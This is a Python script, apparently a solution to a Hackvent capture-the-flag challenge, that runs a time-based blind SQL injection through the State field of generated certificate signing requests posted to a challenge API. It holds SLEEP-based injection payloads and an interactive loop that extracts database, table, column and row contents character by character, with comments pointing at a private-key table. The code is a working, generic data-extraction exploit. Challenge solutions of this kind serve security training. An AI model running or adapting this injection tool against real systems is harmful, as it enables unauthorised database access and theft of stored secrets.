#!/usr/bin/env python3

from OpenSSL import crypto, SSL
import requests
from datetime import datetime


# Function to generate CSR with State field
def generateCSR(state):
    global key

    if len(state) > 128:
        print("State too long: {}".format(state))
        exit()

    req = crypto.X509Req()
    req.get_subject().stateOrProvinceName = state

    req.set_pubkey(key)
    req.sign(key, "sha1")

    return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)


# Send a CSR request to Hackvent page
def doRequest(csr):
    url = "http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument=&key=E7g24fPcZgL5dg78"
    start = datetime.now()
    requests.post(url, data = { 'csr': csr.decode('ascii') })
    end = datetime.now()

    return (end - start).total_seconds()


# Probe how many entries exist
def probe_count(col_name, from_schema, where = ""):
    if len(where) == 0:
        query = "'+IF((SELECT COUNT(" + col_name + ") FROM " + from_schema + ")={0},SLEEP(3),1)+'"
    else:
        query = "'+IF((SELECT COUNT(" + col_name + ") FROM " + from_schema + " WHERE " + where + ")={0},SLEEP(3),1)+'"

    count = 1
    while True:
        inject = query.format(count)
        #print(inject)
        csr = generateCSR(inject)

        if doRequest(csr) > 2.8:
            break
        count += 1

    return count


# Probe the length of an entry
def probe_length(col_name, from_schema, limit, where = ""):
    if len(where) == 0:
        query = "'+IF((SELECT LENGTH(" + col_name + ") FROM " + from_schema + " LIMIT {0})={1},SLEEP(3),1)+'"
    else:
        query = "'+IF((SELECT LENGTH(" + col_name + ") FROM " + from_schema + " WHERE " + where + " LIMIT {0})={1},SLEEP(3),1)+'"

    length = 1
    while True:
        inject = query.format(limit, length)
        csr = generateCSR(inject)

        #print("Probing length {}: {}".format(length, elapsed.total_seconds()))
        if doRequest(csr) >= 2.8:
            break
        length += 1

    return length


# Probe the name of an entry
def probe_name(col_name, from_schema, limit, length, where = ""):
    if len(where) == 0:
        query = "'+IF((SELECT MID(" + col_name + ",{1},1) FROM " + from_schema + " LIMIT {0})= BINARY \"{2}\",SLEEP(3),1)+'"  
    else:
        query = "'+IF((SELECT MID(" + col_name + ",{1},1) FROM " + from_schema + " WHERE " + where + " LIMIT {0})=\"{2}\",SLEEP(3),1)+'"

    #abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$"
    abc = "abcdefghijklmnopqrstuvwxyz0123456789_.:?/&-=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    name = ""
    for i in range(1, length + 1):
        found = 0
        for c in abc:
            inject = query.format(limit, i, c)
            #print(inject)
            csr = generateCSR(inject)

            #print("Probing char #{} == {}: {}".format(i, c, elapsed.total_seconds()))
            if doRequest(csr) > 2.8:
                name += c
                print("Probing: {}".format(name), end='\r')
                found = 1
                break

        if found == 0:
            name += '#'
            print("Probing: {}".format(name), end='\r')

    print()
    return name


# Generate small RSA key
key = crypto.PKey()
key.generate_key(crypto.TYPE_RSA, 512)


print("##### Probing Database count")
db_count = probe_count("schema_name", "information_schema.schemata")
print("##### Found {} Databases".format(db_count))

dbs = {}
tbls = {}
cols = {}
# Use this to directly jump to the interesting part
#dbs = {1: "hv24_2"}
#tbls = {'db_1_tbl_1': 'certificates', 'db_1_tbl_2': 'keystorage'}
#cols = {'db_1_tbl_2':{1: 'private_key'}}

while True:
    cmd = input("What to do? (D)atabase (T)able (C)olumn D(a)ta: ")

    if cmd == "D" or cmd == "d":
        db = int(input("Database number to probe (max {}): ".format(db_count)))
        if db <= 0 or db > db_count:
            break

        print("Probing length...")
        l = probe_length("schema_name", "information_schema.schemata", "{},1".format(db-1))
        print("##### DB #{} Name has length {}".format(db, l))

        print("Probing name...")
        n = probe_name("schema_name", "information_schema.schemata", "{},1".format(db-1), l)
        dbs[db] = n
        print("##### DB #{} Name: {}".format(db, n))

    elif cmd == "T" or cmd == "t":
        print("Probed Databases")
        print(dbs)

        db = int(input("Select database: "))
        if db in dbs:
            print("##### Probing table count")
            where = "table_schema=\"{}\"".format(dbs[db])
            tbl_count = probe_count("table_name", "information_schema.tables", where)
            print("##### Found {} Tables".format(tbl_count))

            tbl = int(input("Table number to probe(max {}): ".format(tbl_count)))
            if tbl <= 0 or tbl > tbl_count:
                break

            print("Probing length...")
            limit = "{},1".format(tbl-1)
            l = probe_length("table_name", "information_schema.tables", limit, where)
            print("##### Table #{} Name has length {}".format(tbl, l))

            print("Probing name...")
            n = probe_name("table_name", "information_schema.tables", limit, l, where)
            idx = "db_{}_tbl_{}".format(db, tbl)
            tbls[idx] = n
            print("##### Table #{} Name: {}".format(tbl, n))

    elif cmd == "C" or cmd == "c":
        print("Probed Databases")
        print(dbs)

        db = int(input("Select database: "))
        if db in dbs:
            print("Probed Tables")
            print(tbls)

            tbl = int(input("Select table: "))
            idx = "db_{}_tbl_{}".format(db, tbl)
            if idx in tbls:
                print("##### Probing column count")
                where = "table_name=\"{}\"".format(tbls[idx])
                col_count = probe_count("column_name", "information_schema.columns", where)
                print("##### Found {} Columns".format(col_count))

                tbl_col = {}
                for i in range(0, col_count):
                    print("Probing length...")
                    limit = "{},1".format(i)
                    l = probe_length("column_name", "information_schema.columns", limit, where)
                    print("##### Column #{} Name has length {}".format(i+1, l))

                    print("Probing name...")
                    n = probe_name("column_name", "information_schema.columns", limit, l, where)
                    tbl_col[i+1] = n
                    print("##### Column #{} Name: {}".format(i+1, n))
                cols[idx] = tbl_col

    elif cmd == "a" or cmd == "a":
        print("Probed Databases")
        print(dbs)

        db = int(input("Select database: "))
        if db in dbs:
            print("Probed Tables")
            print(tbls)

            tbl = int(input("Select table: "))
            idx = "db_{}_tbl_{}".format(db, tbl)
            if idx in cols:
                print("Probed columns")
                print(cols[idx])

                col = int(input("Select column: "))
                if col in cols[idx]:
                    print("Probing count...")
                    table = "{}.{}".format(dbs[db], tbls[idx])
                    row_count = probe_count(cols[idx][col], table)
                    print("##### Found {} rows".format(row_count))

                    i = int(input("Select row: "))
                    if i < 0 or i > row_count:
                        break

                    print("Probing length...")
                    limit = "{},1".format(i-1)
                    l = probe_length(cols[idx][col], table, limit)
                    print("##### Data has length {}".format(l))

                    print("Probing data...")
                    d = probe_name(cols[idx][col], table, limit, l)
                    print("##### Data: {}".format(d))

    else:
        break




#print("##### Name of table #{} has length {}".format(1, length))



#print("##### Name of table #{}: {}".format(1, table))
